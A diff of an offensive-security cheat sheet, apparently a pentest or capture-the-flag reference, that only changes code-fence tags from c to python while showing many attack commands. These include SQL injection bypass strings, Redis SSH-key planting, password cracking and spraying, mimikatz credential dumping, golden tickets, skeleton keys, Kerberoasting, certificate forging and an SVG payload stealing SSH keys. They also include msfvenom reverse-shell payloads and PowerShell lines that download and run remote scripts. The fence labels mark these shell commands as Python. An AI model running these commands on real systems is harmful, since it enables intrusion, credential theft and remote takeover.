 psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
 psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
@@ -2040,7 +2040,7 @@ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 
 ### Common Commands
 
-```c
+```python
 postgres=# \list                     // list all databases
 postgres=# \c                        // use database
 postgres=# \c <DATABASE>             // use specific database
@@ -2059,7 +2059,7 @@ postgres=# \q                        // quit
 
 #### Redis
 
-```c
+```python
 > AUTH <PASSWORD>
 > AUTH <USERNAME> <PASSWORD>
 > INFO SERVER
@@ -2077,7 +2077,7 @@ postgres=# \q                        // quit
 
 ##### Enter own SSH Key
 
-```c
+```python
 redis-cli -h <RHOST>
 echo "FLUSHALL" | redis-cli -h <RHOST>
 (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
@@ -2099,7 +2099,7 @@ OK
 
 #### sqlcmd
 
-```c
+```python
 sqlcmd -S <RHOST> -U <USERNAME>
 ```
 
@@ -2107,7 +2107,7 @@ sqlcmd -S <RHOST> -U <USERNAME>
 
 ##### Master List
 
-```c
+```python
 admin' or '1'='1
 ' or '1'='1
 " or "1"="1
@@ -2134,7 +2134,7 @@ admin' or '1'='1
 
 ##### Authentication Bypass
 
-```c
+```python
 '-'
 ' '
 '&'
@@ -2234,17 +2234,17 @@ admin") or "1"="1"/*
 
 #### SQL Truncation Attack
 
-```c
+```python
 'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
 ```
 
 #### sqlite3
 
-```c
+```python
 sqlite3 <FILE>.db
 ```
 
-```c
+```python
 sqlite> .tables
 sqlite> PRAGMA table_info(<TABLE>);
 sqlite> SELECT * FROM <TABLE>;
@@ -2252,7 +2252,7 @@ sqlite> SELECT * FROM <TABLE>;
 
 #### sqsh
 
-```c
+```python
 sqsh -S <RHOST> -U <USERNAME>
 ```
 
@@ -2260,7 +2260,7 @@ sqsh -S <RHOST> -U <USERNAME>
 
 #### CrackMapExec
 
-```c
+```python
 crackmapexec ldap -L
 crackmapexec mysql -L
 crackmapexec smb -L
@@ -2268,7 +2268,7 @@ crackmapexec ssh -L
 crackmapexec winrm -L
 ```
 
-```c
+```python
 crackmapexec smb <RHOST> -u '' -p '' --shares
 crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
@@ -2305,7 +2305,7 @@ crackmapexec <PROTOCOL> <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wo
 
 #### fcrack
 
-```c
+```python
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
 ```
 
@@ -2319,11 +2319,11 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
 
 > https://hashcat.net/wiki/doku.php?id=example_hashes
 
-```c
+```python
 hashcat --example-hashes
 ```
 
-```c
+```python
 hashcat -m 0 md5 /usr/share/wordlists/rockyou.txt
 hashcat -m 100 sha-1 /usr/share/wordlists/rockyou.txt
 hashcat -m 1400 sha256 /usr/share/wordlists/rockyou.txt
@@ -2338,43 +2338,43 @@ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
 
 ##### Cracking ASPREPRoast Password File
 
-```c
+```python
 hashcat -m 18200 -a 0 <FILE> <FILE>
 ```
 
 ##### Cracking Kerberoasting Password File
 
-```c
+```python
 hashcat -m 13100 --force <FILE> <FILE>
 ```
 
 ##### Bruteforce based on the Pattern
 
-```c
+```python
 hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
 ```
 
 ##### Generate Password Candidates: Wordlist + Pattern
 
-```c
+```python
 hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
 ```
 
 ##### Generate NetNLTMv2 with internalMonologue and crack with hashcat
 
-```c
+```python
 InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
 ```
 
 ###### Result
 
-```c
+```python
 spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
 ```
 
 ##### Crack with hashcat
 
-```c
+```python
 hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
 ```
 
@@ -2384,28 +2384,28 @@ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c
 
 ##### Cracking with OneRuleToRuleThemAll.rule
 
-```c
+```python
 hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
 ```
 
 #### Hydra
 
-```c
+```python
 hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
 hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
 hydra -C /PATH/TO/WORDLIST/<FILE> <RHOST> ftp
 ```
 
-```c
+```python
 export HYDRA_PROXY=connect://127.0.0.1:8080
 unset HYDRA_PROXY
 ```
 
-```c
+```python
 hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
 ```
 
-```c
+```python
 hydra <RHOST> http-post-form -L /PATH/TO/WORDLIST/<FILE> "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /PATH/TO/WORDLIST/<FILE>
 
 hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
@@ -2415,7 +2415,7 @@ hydra -l admin -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/Account/logi
 
 #### John
 
-```c
+```python
 /usr/share/john/ssh2john.py id_rsa > hash
 john hash --wordlist=/usr/share/wordlists/rockyou.txt <FILE>
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt <FILE>
@@ -2426,19 +2426,19 @@ john --show <FILE>
 
 ##### User Enumeration
 
-```c
+```python
 ./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
 ```
 
 ##### Password Spray
 
-```c
+```python
 ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
 ```
 
 #### LaZagne
 
-```c
+```python
 laZagne.exe all
 ```
 
@@ -2446,7 +2446,7 @@ laZagne.exe all
 
 ##### Dump Hshes
 
-```c
+```python
 .\mimikatz.exe
 sekurlsa::minidump /users/admin/Desktop/lsass.DMP
 sekurlsa::LogonPasswords
@@ -2457,7 +2457,7 @@ meterpreter > golden_ticket_create
 
 ##### Pass the Ticket
 
-```c
+```python
 .\mimikatz.exe
 sekurlsa::tickets /export
 kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
@@ -2467,7 +2467,7 @@ dir \\<RHOST>\admin$
 
 ##### Forging Golden Ticket
 
-```c
+```python
 .\mimikatz.exe
 privilege::debug
 lsadump::lsa /inject /name:krbtgt
@@ -2479,7 +2479,7 @@ dir \\<RHOST>\admin$
 
 ##### Skeleton Key
 
-```c
+```python
 privilege::debug
 misc::skeleton
 net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
@@ -2488,7 +2488,7 @@ dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 
 #### pypykatz
 
-```c
+```python
 pypykatz lsa minidump lsass.dmp
 pypykatz registry --sam sam system
 ```
@@ -2505,7 +2505,7 @@ pypykatz registry --sam sam system
 
 ##### poc.svg
 
-```c
+```python
 <image authenticate='ff" `echo $(cat /home/<USERNAME>/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
   <read filename="pdf:/etc/passwd"/>
   <get width="base-width" height="base-height" />
@@ -2517,14 +2517,14 @@ pypykatz registry --sam sam system
 </image>
 ```
 
-```c
+```python
 convert poc.svg poc.png
 cp /tmp/poc.svg /var/www/html/convert_images/
 ```
 
 #### Metasploit
 
-```c
+```python
 $ sudo msfdb run                   // start database
 $ sudo msfdb init                  // database initialization
 $ msfdb --use-defaults delete      // delete existing databases
@@ -2618,13 +2618,13 @@ meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwardi
 
 ##### Metasploit through Proxychains
 
-```c
+```python
 proxychains -q msfconsole
 ```
 
 ##### Auxiliary Output Directory
 
-```c
+```python
 /home/<USERNAME>/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
 ```
 
@@ -2632,13 +2632,13 @@ proxychains -q msfconsole
 
 ###### Generate Payload
 
-```c
+```python
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
 ```
 
 ###### Setup Listener for Microsoft Windows
 
-```c
+```python
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
@@ -2652,11 +2652,11 @@ msf6 exploit(multi/handler) > run
 
 ###### Download Files
 
-```c
+```python
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe
 ```
 
-```c
+```python
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
@@ -2668,11 +2668,11 @@ LPORT => <LPORT>
 msf6 exploit(multi/handler) > run
 ```
 
-```c
+```python
 .\<FILE>.exe
 ```
 
-```c
+```python
 meterpreter > download *
 ```
 
@@ -2680,14 +2680,14 @@ meterpreter > download *
 
 ### ADCSTemplate
 
-```c
+```python
 Import-Module .\ADCSTemplate.psm1
 New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
 ```
 
 #### BloodHound
 
-```c
+```python
 pip install bloodhound
 sudo apt-get install neo4j
 sudo apt-get install bloodhound
@@ -2695,7 +2695,7 @@ sudo apt-get install bloodhound
 
 ##### Installing and starting Database
 
-```c
+```python
 wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
 sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
 sudo apt-get update
@@ -2704,7 +2704,7 @@ sudo apt-get install neo4j
 systemctl start neo4j
 ```
 
-```c
+```python
 sudo neo4j start console
 sudo bloodhound --no-sandbox
 ```
@@ -2713,7 +2713,7 @@ sudo bloodhound --no-sandbox
 
 ###### Docker Container
 
-```c
+```python
 docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/<PASSWORD> -v $(pwd)/neo4j:/data neo4j:4.4-community
 ```
 
@@ -2721,13 +2721,13 @@ docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/<PASSWORD> -v $
 
 >  http://localhost:7474/browser/
 
-```c
+```python
 ALTER USER neo4j SET PASSWORD '<PASSWORD>'
 ```
 
 #### BloodHound Python
 
-```c
+```python
 bloodhound-python -d <DOMAIN> -u <USERNAME> -p "<PASSWORD>" -gc <DOMAIN> -c all -ns <RHOST>
 bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <RHOST> -c All
 bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <RHOST> -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
@@ -2735,7 +2735,7 @@ bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <RHOST> -ns <RHO
 
 #### bloodyAD
 
-```c
+```python
 bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object Users --attr member                                        // Get group members
 bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr minPwdLength                 // Get minimum password length policy
 bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get object 'DC=<DOMAIN>,DC=local' --attr msDS-Behavior-Version        // Get AD functional level
@@ -2757,7 +2757,7 @@ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get dnsDump     
 
 > https://github.com/GhostPack/Certify
 
-```c
+```python
 .\Certify find /vulnerable
 .\Certify.exe find /vulnerable /currentuser
 ```
@@ -2768,37 +2768,37 @@ bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <RHOST> get dnsDump     
 
 > https://github.com/ly4k/BloodHound/
 
-```c
+```python
 certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
 certipy find -dc-ip <RHOST> -u <USERNAME> -p <PASSWORD> -vulnerable -stdout
 ```
 
 ##### Account Creation
 
-```c
+```python
 certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <DOMAIN_CONTROLLER_DNS_NAME> -user <COMPUTERNAME>
 ```
 
 ##### Authentication
 
-```c
+```python
 certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN>
 ```
 
 ###### LDAP-Shell
 
-```c
+```python
 certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap-shell
 ```
 
-```c
+```python
 # add_user <USERNAME>
 # add_user_to_group <GROUP>
 ```
 
 ##### Certificate Forging
 
-```c
+```python
 certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
 ```
 
@@ -2806,43 +2806,43 @@ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template We
 
 Run the following command twice because of a current issue with `certipy`.
 
-```c
+```python
 certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
 ```
 
-```c
+```python
 certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN>
 certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN> -debug
 ```
 
 ##### Revert Changes
 
-```c
+```python
 certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLATE> -dc-ip <RHOST> -configuration <TEMPLATE>.json
 ```
 
 ##### Start BloodHound Fork
 
-```c
+```python
 ./BloodHound --disable-gpu-sandbox
 ```
 
 #### enum4linux-ng
 
-```c
+```python
 enum4linux-ng -A <RHOST>
 ```
 
 #### Evil-WinRM
 
-```c
+```python
 evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
 evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
 ```
 
 #### Impacket
 
-```c
+```python
 impacket-atexec -k -no-pass <DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
 impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
 impacket-getST <DOMAIN>/<USERNAME>$ -spn WWW/<DOMAIN_CONTROLLER>.<DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
@@ -2858,7 +2858,7 @@ impacket-smbserver local . -smb2support
 
 ##### impacket-smbclient
 
-```c
+```python
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-smbclient <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
 impacket-smbclient -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass
@@ -2866,14 +2866,14 @@ impacket-smbclient -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass
 
 ##### impacket-getTGT
 
-```c
+```python
 impacket-getTGT <RHOST>/<USERNAME>:<PASSWORD>
 impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
 ```
 
 ##### impacket-GetNPUsers
 
-```c
+```python
 impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 impacket-GetNPUsers <RHOST>/<USERNAME> -request -no-pass -dc-ip <RHOST>
 impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format john -outputfile hashes
@@ -2881,14 +2881,14 @@ impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format john -outputfile h
 
 ##### impacket-getUserSPNs
 
-```c
+```python
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
 ```
 
 ##### impacket-secretsdump
 
-```c
+```python
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-secretsdump <RHOST>/<USERNAME>@<RHOST>
 impacket-secretsdump -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass -debug
@@ -2899,7 +2899,7 @@ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 
 ##### impacket-psexec
 
-```c
+```python
 impacket-psexec <USERNAME>@<RHOST>
 impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
 ```
@@ -2912,7 +2912,7 @@ impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b5
 * NTHASH
 * Domain-SID
 
-```c
+```python
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <RHOST> -spn MSSQLSVC/<RHOST>.<RHOST> -user-id 500 Administrator
 ```
@@ -2921,7 +2921,7 @@ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-
 
 ###### Issue
 
-```c
+```python
 impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<RHOST> -no-pass -request
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -2930,7 +2930,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 ###### How to fix it
 
-```c
+```python
 241         if self.__doKerberos:
 242             #target = self.getMachineName()
 243             target = self.__kdcHost
@@ -2940,13 +2940,13 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 > https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py
 
-```c
+```python
 $ python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
 ```
 
 ###### Fixing msada_guids Error
 
-```c
+```python
 #from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
 from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
 ```
@@ -2959,13 +2959,13 @@ Then put the `msada_guids.py` into the same directory as `dacledit.py`
 
 > https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py
 
-```c
+```python
 $ python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
 ```
 
 #### JAWS
 
-```c
+```python
 IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
 ```
 
@@ -2981,19 +2981,19 @@ IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.p
 
 ##### Bruteforce
 
-```c
+```python
 ./kerbrute -domain <DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
 ```
 
 ###### With List of Users
 
-```c
+```python
 .\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
 ```
 
 ###### Check Passwords for all Users in Domain
 
-```c
+```python
 .\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
 ```
 
@@ -3001,27 +3001,27 @@ IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.p
 
 ###### Check ASPREPRoast for all Domain Users (Credentials required)
 
-```c
+```python
 impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
 impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format john -outputfile <FILE>
 ```
 
 ###### Check ASPREPRoast for a List of Users (No Credentials required)
 
-```c
+```python
 impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
 impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
 ```
 
 ###### Check ASPREPRoast for all Domain Users in Domain
 
-```c
+```python
 .\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
 ```
 
 ##### Kerberoasting
 
-```c
+```python
 impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
 .\Rubeus.exe kerberoast /outfile:<FILE>
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
@@ -3033,31 +3033,31 @@ Invoke-Kerberoast -OutputFormat john | % \{ $_.Hash } | Out-File -Encoding ASCII
 
 ###### Request TGT with Hash
 
-```c
+```python
 impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
 ```
 
 ###### Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)
 
-```c
+```python
 impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
 ```
 
 ###### Request TGT with Password
 
-```c
+```python
 impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
 ```
 
 ###### Set TGT for Impacket Usage
 
-```c
+```python
 export KRB5CCNAME=<USERNAME>.ccache
 ```
 
 ###### Execute Remote Commands
 
-```c
+```python
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
@@ -3065,13 +3065,13 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 
 ###### Ask and inject the Ticket
 
-```c
+```python
 .\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
 ```
 
 ###### Execute a CMD on Remote Host
 
-```c
+```python
 .\PsExec.exe -accepteula \\<RHOST> cmd
 ```
 
@@ -3081,7 +3081,7 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 
 ###### Check Type and Location of Tickets
 
-```c
+```python
 grep default_ccache_name /etc/krb5.conf
 ```
 
@@ -3091,21 +3091,21 @@ grep default_ccache_name /etc/krb5.conf
 * To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
 * To inject, the Ticket have to be copied in a reachable Folder by all Users
 
-```c
+```python
 cp tickey /tmp/tickey
 /tmp/tickey -i
 ```
 
 ###### Harvest Tickets from Windows
 
-```c
+```python
 sekurlsa::tickets /export
 .\Rubeus dump
 ```
 
 ###### Convert Tickets dumped with Rubeus into base64
 
-```c
+```python
 [IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
 ```
 
@@ -3113,20 +3113,20 @@ sekurlsa::tickets /export
 
 > https://github.com/Zer1t0/ticket_converter
 
-```c
+```python
 python ticket_converter.py ticket.kirbi ticket.ccache
 python ticket_converter.py ticket.ccache ticket.kirbi
 ```
 
 ###### Using Ticket on Linux
 
-```c
+```python
 export KRB5CCNAME=<USERNAME>.ccache
 ```
 
 ###### Execute Remote Commands by using TGT
 
-```c
+```python
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
@@ -3136,19 +3136,19 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 
 ###### Inject Ticket with mimikatz
 
-```c
+```python
 kerberos::ptt <KIRBI_FILE>
 ```
 
 ###### Inject Ticket with Rubeus
 
-```c
+```python
 .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
 ```
 
 ###### Execute a CMD on Remote Host
 
-```c
+```python
 .\PsExec.exe -accepteula \\<RHOST> cmd
 ```
 
@@ -3158,25 +3158,25 @@ kerberos::ptt <KIRBI_FILE>
 
 ###### Generate TGS with NTLM
 
-```c
+```python
 python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
 ```
 
 ###### Generate TGS with aesKey
 
-```c
+```python
 python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
 ```
 
 ###### Set the ticket for impacket use
 
-```c
+```python
 export KRB5CCNAME=<USERNAME>.ccache
 ```
 
 ###### Execute Remote Commands by using TGT
 
-```c
+```python
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
@@ -3186,37 +3186,37 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 
 ###### Generate TGS with NTLM
 
-```c
+```python
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
 ```
 
 ###### Generate TGS with AES 128bit Key
 
-```c
+```python
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
 ```
 
 ###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
 
-```c
+```python
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
 ```
 
 ###### Inject TGS with Mimikatz
 
-```c
+```python
 kerberos::ptt <KIRBI_FILE>
 ```
 
 ##### Rubeus Examples
 
-```c
+```python
 .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
 ```
 
 ###### Execute CMD on Remote Host
 
-```c
+```python
 .\PsExec.exe -accepteula \\<RHOST> cmd
 ```
 
@@ -3226,25 +3226,25 @@ kerberos::ptt <KIRBI_FILE>
 
 ###### Generate TGT with NTLM
 
-```c
+```python
 python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
 ```
 
 ###### Generate TGT with aesKey
 
-```c
+```python
 python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
 ```
 
 ###### Set TGT for Impacket Usage
 
-```c
+```python
 export KRB5CCNAME=<USERNAME>.ccache
 ```
 
 ###### Execute Remote Commands by using TGT
 
-```c
+```python
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
@@ -3254,25 +3254,25 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 
 ###### Generate TGT with NTLM
 
-```c
+```python
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
 ```
 
 ###### Generate TGT with AES 128bit Key
 
-```c
+```python
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
 ```
 
 ###### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
 
-```c
+```python
 kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
 ```
 
 ###### Inject TGT with Mimikatz
 
-```c
+```python
 kerberos::ptt <KIRBI_FILE>
 ```
 
@@ -3280,25 +3280,25 @@ kerberos::ptt <KIRBI_FILE>
 
 ###### Inject Ticket with Rubeus
 
-```c
+```python
 .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
 ```
 
 ###### Execute CMD on Remote Host
 
-```c
+```python
 .\PsExec.exe -accepteula \\<RHOST> cmd
 ```
 
